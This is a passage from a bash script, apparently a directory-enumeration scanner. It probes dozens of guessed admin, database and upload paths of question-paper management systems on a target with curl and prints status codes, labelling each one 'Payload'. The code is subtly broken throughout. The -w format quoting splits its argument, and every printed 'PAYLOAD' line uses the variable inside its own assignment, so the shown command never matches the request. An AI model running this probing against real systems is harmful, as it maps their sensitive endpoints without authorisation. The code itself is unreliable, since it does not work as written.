         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_PMassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_PMassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaperOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaperOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader_Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader_Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem-CloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem-CloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool_QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool_QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload-ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload-ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard-Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt-Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt-Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase_Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase_Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationQPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationQPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control_QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control_QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystemHandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystemHandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer_QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer_QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUpload-QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUpload-QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring_QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring_QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing_QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing_QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflowDataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflowDataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlerQPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlerQPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringQPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringQPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor_QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor_QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin-System/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin-System/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService-Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService-Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal-QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal-QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBDataMonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBDataMonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite_QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite_QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch-AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster-ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster-ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSyncQPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSyncQPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload-Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite_TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite_TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation_QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation_QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper-DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper-DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdminPortal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdminPortal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMasterTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMasterTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal_QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal_QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagementQPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagementQPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module_QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module_QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControlAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControlAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBDataCloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBDataCloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper_Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper_Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal-QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal-QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto-Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto-Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops_QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops_QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem-ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem-ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMasterDataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMasterDataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch-FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDocCloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDocCloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_PUploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_PUploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBDataAutomation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBDataAutomation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync-QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync-QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster_Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster_Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster_DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster_DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-FileUpload/"]: "
